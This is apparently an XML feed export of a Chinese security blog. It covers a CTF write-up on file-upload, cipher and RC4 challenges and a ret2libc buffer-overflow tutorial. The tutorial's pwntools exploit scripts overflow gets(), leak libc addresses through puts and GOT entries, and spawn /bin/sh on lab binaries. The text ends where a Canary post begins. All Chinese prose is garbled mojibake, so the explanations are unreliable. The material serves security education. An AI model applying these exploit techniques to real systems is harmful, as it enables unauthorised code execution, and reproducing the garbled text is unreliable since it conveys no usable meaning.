alt></p><p>éé¢„æœŸè§£æ³•ï¼š</p><p>æ§åˆ¶URLä¸­nameå‚æ•°ç›´æ¥ä¸Šä¼ phpæ–‡ä»¶</p><p><img src="/2020/03/20/%E5%AE%89%E6%81%92%E6%9D%AF%E4%B8%A8%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B/image-20200128135733422.png" alt></p><p><img src="/2020/03/20/%E5%AE%89%E6%81%92%E6%9D%AF%E4%B8%A8%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B/image-20200128135811226.png" alt></p><p><img src="/2020/03/20/%E5%AE%89%E6%81%92%E6%9D%AF%E4%B8%A8%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B/%E5%AE%89%E6%81%92%E6%9D%AF%E4%B8%A8%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B%5Cimage-20200128135857775.png" alt></p><p>nepnepæˆ˜é˜Ÿè§£æ³•ï¼š</p><p>åœ¨upload.phpé¡µé¢ä¸Šä¼ ï¼Œgetæäº¤å‚æ•°name=flag.php</p><p><img src="/2020/03/20/%E5%AE%89%E6%81%92%E6%9D%AF%E4%B8%A8%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B/%E5%AE%89%E6%81%92%E6%9D%AF%E4%B8%A8%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B%5C11.png" alt></p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="0x-01-å¯†ç æœ¬ï¼ˆæäº¤ä½ æ‰¾åˆ°çš„å­—ç¬¦ä¸²çš„md5å€¼ï¼‰"><a href="#0x-01-å¯†ç æœ¬ï¼ˆæäº¤ä½ æ‰¾åˆ°çš„å­—ç¬¦ä¸²çš„md5å€¼ï¼‰" class="headerlink" title="0x 01 å¯†ç æœ¬ï¼ˆæäº¤ä½ æ‰¾åˆ°çš„å­—ç¬¦ä¸²çš„md5å€¼ï¼‰"></a>0x 01 å¯†ç æœ¬ï¼ˆæäº¤ä½ æ‰¾åˆ°çš„å­—ç¬¦ä¸²çš„md5å€¼ï¼‰</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">è¿™ä¸ªå¯†ç æœ¬æœ¬è¯¥åªä½¿ç”¨ä¸€æ¬¡çš„ï¼Œä½†æ˜¯å´ä½¿ç”¨äº†å¤šæ¬¡ï¼Œå¯¼è‡´å¯†æ–‡æ˜“è¢«ç ´è§£</span><br><span class="line">ç»è¿‡ä¸€ç•ªå°è¯•å‘ç°ï¼Œç§˜é’¥çš„é¦–å­—æ¯å¾ˆå¯èƒ½æ˜¯yï¼Œå‰©ä¸‹çš„å°±é ä½ äº†</span><br><span class="line"></span><br><span class="line">cip1: rlojsfklecby</span><br><span class="line">cip2: ulakqfgfsjlu</span><br><span class="line">cip3: dpaxwxtjgtay</span><br></pre></td></tr></table></figure><p>å‚è€ƒè§£æ³•ï¼š<a href="https://blog.csdn.net/qq_34072526/article/details/88074122" target="_blank" rel="noopener">https://blog.csdn.net/qq_34072526/article/details/88074122</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">key &#x3D; &#39;yearofthepig&#39;</span><br><span class="line">t1 &#x3D; &#39;rlojsfklecby&#39;</span><br><span class="line">t2 &#x3D; &#39;ulakqfgfsjlu&#39;</span><br><span class="line">t3 &#x3D; &#39;dpaxwxtjgtay&#39;</span><br><span class="line">res1 &#x3D; res2 &#x3D; res3 &#x3D; &#39;&#39;</span><br><span class="line">for i in range(len(key)):</span><br><span class="line">    res1 +&#x3D; chr((ord(t1[i]) - ord(key[i])) %26 + ord(&#39;a&#39;))</span><br><span class="line">    res2 +&#x3D; chr((ord(t2[i]) - ord(key[i])) %26 + ord(&#39;a&#39;))</span><br><span class="line">    res3 +&#x3D; chr((ord(t3[i]) - ord(key[i])) %26 + ord(&#39;a&#39;))</span><br><span class="line">print res1</span><br><span class="line">print res2</span><br><span class="line">print res3</span><br></pre></td></tr></table></figure><p>è½¬æ¢ä¸ºmd5å³ä¸ºflag</p><h3 id="0x-02-EasyProgram"><a href="#0x-02-EasyProgram" class="headerlink" title="0x 02 EasyProgram"></a>0x 02 EasyProgram</h3><p>è¿™é“é¢˜ç»™å‡ºçš„æ˜¯ä¼ªä»£ç ï¼Œä»ä¼ªä»£ç ä¸­å¯ä»¥çœ‹å‡ºï¼Œè¿™æ˜¯ä¸€ä¸ªRC4åŠ å¯†ï¼Œäºæ˜¯ä½¿ç”¨RC4è§£å¯†å³å¯ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import io</span><br><span class="line">f &#x3D; io.open(&#39;file.txt&#39;,&#39;r&#39;,encoding&#x3D;&#39;ISO-8859-1&#39;)</span><br><span class="line">c &#x3D; f.read()</span><br><span class="line">t &#x3D; []</span><br><span class="line">key &#x3D; &#39;whoami&#39;</span><br><span class="line">ch &#x3D; &#39;&#39;</span><br><span class="line">j &#x3D; 0 #åˆå§‹åŒ–</span><br><span class="line">s &#x3D; list(range(256)) #åˆ›å»ºæœ‰åºåˆ—è¡¨</span><br><span class="line">for i in range(256):</span><br><span class="line">    j &#x3D; (j + s[i] + ord(key[i % len(key)])) % 256</span><br><span class="line">    s[i],s[j] &#x3D; s[j],s[i]</span><br><span class="line">i &#x3D; 0 #åˆå§‹åŒ–</span><br><span class="line">j &#x3D; 0 #åˆå§‹åŒ–</span><br><span class="line">for r in c:</span><br><span class="line">    i &#x3D; (i + 1)  % 256</span><br><span class="line">    j &#x3D; (j + s[i])  % 256</span><br><span class="line">    s[i], s[j] &#x3D; s[j], s[i]</span><br><span class="line">    x &#x3D; (s[i] + (s[j] % 256)) % 256</span><br><span class="line">    ch +&#x3D; chr(ord(r) ^ s[x])</span><br><span class="line">print(ch)</span><br></pre></td></tr></table></figure><p>å‚è€ƒé“¾æ¥ï¼š<a href="https://www.cnblogs.com/gambler/p/9075415.html" target="_blank" rel="noopener">RC4åŠ å¯†ç®—æ³•åŸç†ç®€å•ç†è§£</a></p>]]></content>
      
      
      <categories>
          
          <category> ctfwp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å®‰æ’æ¯ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ROP-ret2libcåŸç†åŠåº”ç”¨</title>
      <link href="/2020/03/20/ROP-ret2libc%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/"/>
      <url>/2020/03/20/ROP-ret2libc%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="01-å‰ç½®çŸ¥è¯†"><a href="#01-å‰ç½®çŸ¥è¯†" class="headerlink" title="01 å‰ç½®çŸ¥è¯†"></a>01 å‰ç½®çŸ¥è¯†</h3><ul><li><p>è·å–shellçš„æ–¹å¼</p><ul><li>åºæºç è‡ªå¸¦ç³»ç»Ÿå‘½ä»¤å‡½æ•°                               -ç®€å•æº¢å‡º</li><li>å¯ä»¥æ‰¾åˆ°systemå‡½æ•°çš„pltçš„ç»å¯¹åœ°å€               -ret2text</li><li>åˆ©ç”¨è¾“å…¥å‡½æ•°ï¼Œå°†shellcodeå†™å…¥åˆ°ç¨‹åºä¸­        -ret2shellcode</li><li>åˆ©ç”¨ROPGadgeté…åˆint 0x80è°ƒç”¨execve        -ret2Syscall</li><li>åˆ©ç”¨Libcè·å–systemå‡½æ•°çš„ç›¸å¯¹ä½ç½®.               -ret2Libc</li></ul></li><li><p>plt/gotæ¦‚å¿µ</p><ul><li>pltè¡¨:Procedure Linkage Tableç¨‹åºè”åŠ¨è¡¨ï¼ˆå†…éƒ¨å‡½æ•°è¡¨ï¼‰</li><li>gotè¡¨:Global Offset Table å…¨å±€åç§»è¡¨ï¼ˆå…¨å±€å‡½æ•°è¡¨ï¼‰</li><li>ä¸‹å›¾è·³è¿‡äº†_dl_runtime_resolveå‡½æ•°åœ°å€é‡å®šä½çš„è¿‡ç¨‹ï¼Œç›´æ¥å±•ç¤ºé‡å®šä½åçš„è°ƒç”¨ã€‚<br>ç”±äºLibcçš„å»¶æ—¶ç»‘å®šæœºåˆ¶ï¼Œåªæœ‰æ‰§è¡Œè¿‡çš„å‡½æ•°æ‰ä¼šåœ¨gotè¡¨ä¸­å­˜ä¸‹æ¥ã€‚</li></ul></li></ul><p><img src="/2020/03/20/ROP-ret2libc%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/image-20200122094522330.png" alt></p><h3 id="02-Ret2libcåŸç†"><a href="#02-Ret2libcåŸç†" class="headerlink" title="02 Ret2libcåŸç†"></a>02 Ret2libcåŸç†</h3><p>Libcå°±æ˜¯Linuxä¸‹çš„Cå‡½æ•°åº“ï¼Œ<strong>ret2libc</strong> è¿™ç§æ”»å‡»æ–¹å¼ä¸»è¦æ˜¯é’ˆå¯¹ <strong>åŠ¨æ€é“¾æ¥(Dynamic linking)</strong> ç¼–è¯‘çš„ç¨‹åºï¼Œå› ä¸ºæ­£å¸¸æƒ…å†µä¸‹æ˜¯æ— æ³•åœ¨ç¨‹åºä¸­æ‰¾åˆ°åƒ <strong>system() ã€execve()</strong> è¿™ç§ç³»ç»Ÿçº§å‡½æ•°(å¦‚æœç¨‹åºä¸­ç›´æ¥åŒ…å«äº†è¿™ç§å‡½æ•°å°±å¯ä»¥ç›´æ¥æ§åˆ¶è¿”å›åœ°å€æŒ‡å‘ä»–ä»¬ï¼Œè€Œä¸ç”¨é€šè¿‡è¿™ç§éº»çƒ¦çš„æ–¹å¼)ã€‚å› ä¸ºç¨‹åºæ˜¯åŠ¨æ€é“¾æ¥ç”Ÿæˆçš„ï¼Œæ‰€ä»¥åœ¨ç¨‹åºè¿è¡Œæ—¶ä¼šè°ƒç”¨ <strong>libc.so (ç¨‹åºè¢«è£…è½½æ—¶ï¼ŒåŠ¨æ€é“¾æ¥å™¨ä¼šå°†ç¨‹åºæ‰€æœ‰æ‰€éœ€çš„åŠ¨æ€é“¾æ¥åº“åŠ è½½è‡³è¿›ç¨‹ç©ºé—´ï¼Œlibc.so å°±æ˜¯å…¶ä¸­æœ€åŸºæœ¬çš„ä¸€ä¸ª)</strong>ï¼Œ<strong>libc.so</strong> æ˜¯    linux ä¸‹ C è¯­è¨€åº“ä¸­çš„è¿è¡Œåº“<strong>glibc</strong> çš„åŠ¨æ€é“¾æ¥ç‰ˆï¼Œå¹¶ä¸” <strong>libc</strong>.<strong>so</strong> ä¸­åŒ…å«äº†å¤§é‡çš„å¯ä»¥åˆ©ç”¨çš„å‡½æ•°ï¼ŒåŒ…æ‹¬ <strong>system() ã€execve()</strong> ç­‰ç³»ç»Ÿçº§å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ‰¾åˆ°è¿™äº›å‡½æ•°åœ¨å†…å­˜ä¸­çš„åœ°å€è¦†ç›–æ‰è¿”å›åœ°å€æ¥è·å¾—å½“å‰è¿›ç¨‹çš„æ§åˆ¶æƒã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä¼šé€‰æ‹©æ‰§è¡Œ <strong>system(â€œ/bin/shâ€)</strong> æ¥æ‰“å¼€ shellï¼Œ å¦‚æ­¤å°±åªå‰©ä¸‹ä¸¤ä¸ªé—®é¢˜ï¼š</p><blockquote><p>1ã€æ‰¾åˆ° system() å‡½æ•°çš„åœ°å€ï¼›</p></blockquote><blockquote><p> 2ã€åœ¨å†…å­˜ä¸­æ‰¾åˆ° â€œ/bin/shâ€ è¿™ä¸ªå­—ç¬¦ä¸²çš„åœ°å€ã€‚</p></blockquote><ul><li>æ”»å‡»æµç¨‹</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1ã€æ³„éœ²ä¸€ä¸ªret2libcå‡½æ•°çš„ä½ç½®</span><br><span class="line">2ã€è·å–libcçš„ç‰ˆæœ¬</span><br><span class="line">3ã€æ ¹æ®åç§»è·å–shellå’Œshçš„ä½ç½®</span><br><span class="line">4ã€æ‰§è¡Œç¨‹åºè·å–shell</span><br><span class="line"></span><br><span class="line">libcç‰ˆæœ¬</span><br><span class="line">1ã€https:&#x2F;&#x2F;libc.blukat.meã€‚  2. LibcSearcher</span><br><span class="line"></span><br><span class="line">1ã€æ±‚libcåŸºåœ°å€ï¼ˆå‡½æ•°åŠ¨æ€åœ°å€-å‡½æ•°åç§»é‡ï¼‰</span><br><span class="line">2ã€æ±‚å…¶ä»–å‡½æ•°åœ°å€ï¼ˆåŸºåœ°å€+å‡½æ•°åç§»é‡ï¼‰</span><br></pre></td></tr></table></figure><h3 id="03-å®ä¾‹åˆ†æ"><a href="#03-å®ä¾‹åˆ†æ" class="headerlink" title="03 å®ä¾‹åˆ†æ"></a>03 å®ä¾‹åˆ†æ</h3><h4 id="3-1-ret2libc1"><a href="#3-1-ret2libc1" class="headerlink" title="3.1 ret2libc1"></a>3.1 ret2libc1</h4><ul><li>ä¼ªä»£ç </li></ul><p><img src="/2020/03/20/ROP-ret2libc%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/image-20200122100238760.png" alt></p><p>æœ‰ä¸€ä¸ªgetså‡½æ•°ä¼šæœ‰æº¢å‡ºæ¼æ´ï¼Œç¨‹åºå¼€å¯äº†NXï¼Œè¯´æ˜æˆ‘ä»¬åœ¨æ ˆä¸­çš„æ•°æ®æ²¡æœ‰æ‰§è¡Œæƒé™ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨ROPæ–¹å¼è¿›è¡Œç»•è¿‡ï¼Œæˆ‘ä»¬ä½¿ç”¨gdbçš„patternè¿›è¡Œæµ‹è¯•æº¢å‡ºåç§»é‡æ˜¯112</p><p>æ¥ä¸‹é‡Œæˆ‘ä»¬è¦åšçš„æ˜¯æ‰§è¡Œç³»ç»Ÿå‡½æ•°system(â€œ/bin/shâ€)ï¼Œæ¥è·å–ç³»ç»Ÿçš„æƒé™</p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æƒ³è±¡æˆ‘ä»¬çš„payloadæ˜¯ï¼šâ€™aâ€™ * 112 + system_plt + 0x0000000 + bin_sh_addr</p><p>æˆ‘ä»¬éœ€è¦systemçš„pltåœ°å€ä»¥åŠå­—ç¬¦ä¸²/bin/shçš„åœ°å€</p><p>é€šè¿‡idaçŸ¥é“systemçš„pltåœ°å€</p><p><img src="/2020/03/20/ROP-ret2libc%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/image-20200122100805699.png" alt></p><p>è·å¾—/bin/shçš„åœ°å€ï¼š</p><p><img src="/2020/03/20/ROP-ret2libc%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/image-20200122100918061.png" alt></p><p>exp:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; process(&#39;.&#x2F;ret2libc1&#39;)</span><br><span class="line">system_plt_addr &#x3D; 0x08048460</span><br><span class="line">bin_sh_addr &#x3D; 0x08048720</span><br><span class="line">payload &#x3D; flat([&#39;a&#39; * 112 , system_plt_addr , 0x00000000 , bin_sh_addr])</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="3-2-ret2libc2"><a href="#3-2-ret2libc2" class="headerlink" title="3.2 ret2libc2"></a>3.2 ret2libc2</h4><ul><li>ä¼ªä»£ç </li></ul><p><img src="/2020/03/20/ROP-ret2libc%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/image-20200122101325253.png" alt></p><ul><li>è§£é¢˜æ€è·¯</li></ul><p>è¿™é“é¢˜å’Œç¬¬ä¸€ä¸ªé¢˜æ²¡æœ‰å¤ªå¤§åŒºåˆ«ï¼Œå”¯ä¸€çš„åŒºåˆ«åœ¨äºæ‰¾ä¸åˆ°å­—ç¬¦ä¸²/bin/shçš„åœ°å€äº†ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦é‡æ–°æ„é€ ã€‚</p><p>é™¤äº†åœ¨ç¨‹åºä¸­æŸ¥æ‰¾/bin/shçš„åœ°å€ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ç›´æ¥è®©ç”¨æˆ·è¾“å…¥ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ ä»¥ä¸‹payload</p><p>payload = â€˜aâ€™ + get_plt + pop_ebx + bin_sh + system_plt + 0x00000000 + bin_sh</p><p>payloadé‡Œçš„pop_ebxè¿˜æ˜¯pop eaxéƒ½æ— æ‰€è°“ï¼Œä½†æˆ‘ä»¬ä½¿ç”¨ROPgadgetåœ¨æœç´¢çš„æ—¶å€™åªèƒ½æœåˆ°pop ebxï¼›ret</p><p>bufå˜é‡çš„å€¼æ˜¯bssæ®µçš„å†…å®¹ï¼Œæˆ‘ä»¬ä½¿ç”¨vmmapå°±å¯ä»¥çœ‹åˆ°æœ‰wæƒé™çš„bss,åœ¨æœ€æœ«å°¾-16æ¥ä¿å­˜æˆ‘ä»¬getsè¾“å…¥çš„å†…å®¹ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; process(&#39;.&#x2F;ret2libc2&#39;)</span><br><span class="line">system_plt &#x3D; 0x08048490</span><br><span class="line">gets_plt &#x3D; 0x08048460</span><br><span class="line">buf &#x3D; 0x0804a0e4 - 16</span><br><span class="line">pop_ebx_addr &#x3D; 0x0804843d</span><br><span class="line">payload &#x3D; flat([&#39;a&#39; * 112,gets_plt,pop_ebx_addr,buf,system_plt,0x00000000,buf])</span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2020/03/20/ROP-ret2libc%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/image-20200122102521831.png" alt></p><h4 id="3-3-ret2libc3"><a href="#3-3-ret2libc3" class="headerlink" title="3.3 ret2libc3"></a>3.3 ret2libc3</h4><p>å‘ç°æœ‰getså‡½æ•°ï¼Œå­˜åœ¨æ¼æ´ï¼Œä½¿ç”¨GDBåŠ è½½ç¨‹åº:gdb ./ret2libc3</p><p>å‘ç°æœ‰NXä¿æŠ¤ï¼Œæˆ‘ä»¬ä½¿ç”¨ROPè¿›è¡Œç»•è¿‡ã€‚</p><p>æˆ‘ä»¬å¯ä»¥æ„é€ payload = â€˜aâ€™ * offset + system_plt+0x00000000 + bin_sh_addr</p><p>å‘ç°æ²¡æœ‰systemå’Œ/bin/shï¼Œæ‰€ä»¥æˆ‘ä»¬åªèƒ½é è‡ªå·±è®¡ç®—è¿™ä¸¤ä¸ªçš„å€¼äº†ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•å¾—åˆ° system å‡½æ•°çš„åœ°å€å‘¢ï¼Ÿè¿™é‡Œå°±ä¸»è¦åˆ©ç”¨äº†ä¸¤ä¸ªçŸ¥è¯†ç‚¹</p><ul><li>system å‡½æ•°å±äº libcï¼Œè€Œ libc.so åŠ¨æ€é“¾æ¥åº“ä¸­çš„å‡½æ•°ä¹‹é—´ç›¸å¯¹åç§»æ˜¯å›ºå®šçš„ã€‚</li><li>å³ä½¿ç¨‹åºæœ‰ ASLR ä¿æŠ¤ï¼Œä¹Ÿåªæ˜¯é’ˆå¯¹äºåœ°å€ä¸­é—´ä½è¿›è¡Œéšæœºï¼Œæœ€ä½çš„ 12 ä½å¹¶ä¸ä¼šå‘ç”Ÿæ”¹å˜ã€‚è€Œ libc åœ¨ github ä¸Šæœ‰äººè¿›è¡Œæ”¶é›†ï¼Œå¦‚ä¸‹</li><li><a href="https://github.com/niklasb/libc-database" target="_blank" rel="noopener">https://github.com/niklasb/libc-database</a></li></ul><p>æ‰€ä»¥æˆ‘ä»¬ç¬¬ä¸€ä¸ªè¦åšçš„äº‹æƒ…å°±æ˜¯åˆ¤æ–­è¿™ä¸ªret2libc3ç¨‹åºä¾èµ–çš„å“ªä¸ªlibcï¼Œæ€è·¯å¦‚ä¸‹ï¼š</p><p>1ã€æ³„éœ²ä¸€ä¸ªret2libc3å‡½æ•°çš„ä½ç½®</p><p>2ã€è·å–libcçš„ç‰ˆæœ¬</p><p>3ã€æ ¹æ®åç§»è·å–shellå’Œshçš„ä½ç½®</p><p>4ã€æ‰§è¡Œç¨‹åºè·å–shell</p><p>æˆ‘ä»¬çŸ¥é“åœ¨Linuxçš„ç¨‹åºä¸­ä½¿ç”¨äº†å»¶è¿Ÿç»‘å®šæœºåˆ¶ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸€ä¸ªå‡½æ•°åœ¨æ²¡æœ‰æ‰§è¡Œå‰ï¼Œä½ æ˜¯ä¸çŸ¥é“å®ƒçš„çœŸå®åœ°å€æ˜¯ä»€ä¹ˆçš„ã€‚è€Œè¿™ä¸ªç¨‹åºä¸­æˆ‘ä»¬èƒ½çœ‹åˆ°çš„æœ‰printfå‡½æ•°ã€getså‡½æ•°ã€‚æˆ‘ä»¬é€šè¿‡è¿™ä¸¤ä¸ªå‡½æ•°æ¥ç¡®å®šlibcçš„ç‰ˆæœ¬ã€‚ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import time</span><br><span class="line">p &#x3D; process(&quot;.&#x2F;ret2libc3&quot;)</span><br><span class="line">elf &#x3D; ELF(&quot;.&#x2F;ret2libc3&quot;)</span><br><span class="line">offset &#x3D; 112</span><br><span class="line">#è¦æ³„æ¼çš„å‡½æ•°çš„åœ°å€</span><br><span class="line">target_func &#x3D; &#39;puts&#39;</span><br><span class="line">#è°ƒç”¨putså‡½æ•°è¿›è¡Œæ‰“å°</span><br><span class="line">puts_func &#x3D; &#39;puts&#39;</span><br><span class="line">puts_plt &#x3D; elf.plt[puts_func]</span><br><span class="line">target_got &#x3D; elf.got[target_func]</span><br><span class="line">main_addr &#x3D; elf.symbols[&#39;main&#39;]</span><br><span class="line">#è°ƒç”¨putså‡½æ•°ï¼Œæ‰“å°æ³„æ¼å‡½æ•°çš„gotåœ°å€ï¼Œæœ€åè¿”å›mainå‡½æ•°ï¼Œåœ¨32ä½ç¨‹åºä¸­è°ƒç”¨å‡½æ•°åœ°å€çš„ç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯è¿”å›åœ°å€ï¼Œåé¢çš„æ‰æ˜¯å‚æ•°</span><br><span class="line">payload &#x3D; offset * &#39;a&#39; + p32(puts_plt) + p32(main_addr) + p32(target_got)</span><br><span class="line">#payload &#x3D; flat([offset * &#39;a&#39;,puts_plt,main_addr,puts_got])</span><br><span class="line">p.sendlineafter(&quot;Can you find it !?&quot;,payload)</span><br><span class="line">print hex(u32(p.recv()[0:4]))</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬çœ‹ä¸€ä¸‹ç»“æœï¼šç¡®å®å12ä½æ˜¯ä¸å˜çš„ï¼Œ3e0ã€‚(ä¸€ä¸ªå­—ç¬¦4ä¸ªå­—èŠ‚ï¼Œ3 *4 = 12)</p><p><img src="/2020/03/20/ROP-ret2libc%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/image-20200122103407652.png" alt></p><p>æœ€åexp:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line">sh &#x3D; process(&#39;.&#x2F;ret2libc3&#39;)</span><br><span class="line">ret2libc3 &#x3D; ELF(&#39;.&#x2F;ret2libc3&#39;)</span><br><span class="line">rop &#x3D; ROP(ret2libc3)</span><br><span class="line">func &#x3D; &#39;puts&#39;</span><br><span class="line">puts_plt &#x3D; ret2libc3.plt[&#39;puts&#39;]</span><br><span class="line">libc_start_main_got &#x3D; ret2libc3.got[func]</span><br><span class="line">main &#x3D; ret2libc3.symbols[&#39;main&#39;]# è·å–mainå‡½æ•°åœ°å€</span><br><span class="line">print &quot;leak libc_start_main_got addr and return to main again&quot;</span><br><span class="line">payload &#x3D; flat([&#39;A&#39; * 112, puts_plt, main, libc_start_main_got])</span><br><span class="line">sh.sendlineafter(&#39;Can you find it !?&#39;, payload)</span><br><span class="line">print &quot;get the related addr&quot;</span><br><span class="line">#è·å–putså‡½æ•°è¿è¡Œæ—¶çš„åœ°å€</span><br><span class="line">libc_start_main_addr &#x3D; u32(sh.recv()[0:4])</span><br><span class="line">print libc_start_main_addr</span><br><span class="line"># å®ä¾‹åŒ–LibcSearcherå¯¹è±¡</span><br><span class="line">libc &#x3D; LibcSearcher(func, libc_start_main_addr)</span><br><span class="line"># è®¡ç®—libcçš„åˆå§‹åœ°å€ï¼ˆputsçš„åŠ¨æ€åœ°å€-putsçš„åç§»åœ°å€ï¼‰</span><br><span class="line">libcbase &#x3D; libc_start_main_addr - libc.dump(func)</span><br><span class="line"># è®¡ç®—systemåœ°å€</span><br><span class="line">system_addr &#x3D; libcbase + libc.dump(&#39;system&#39;)</span><br><span class="line"># è®¡ç®—&#x2F;bin&#x2F;shåœ°å€</span><br><span class="line">binsh_addr &#x3D; libcbase + libc.dump(&#39;str_bin_sh&#39;)</span><br><span class="line">print &quot;get shell&quot;</span><br><span class="line">payload &#x3D; flat([&#39;A&#39; * 104, system_addr, 0xdeadbeef, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwnåŸºç¡€çŸ¥è¯† </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> ROP-ret2libcåŸç† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Canaryä¿æŠ¤åŠçªç ´</title>
      <link href="/2020/03/20/Canary%E4%BF%9D%E6%8A%A4%E5%8F%8A%E7%AA%81%E7%A0%B4/"/>
      <url>/2020/03/20/Canary%E4%BF%9D%E6%8A%A4%E5%8F%8A%E7%AA%81%E7%A0%B4/</url>
      
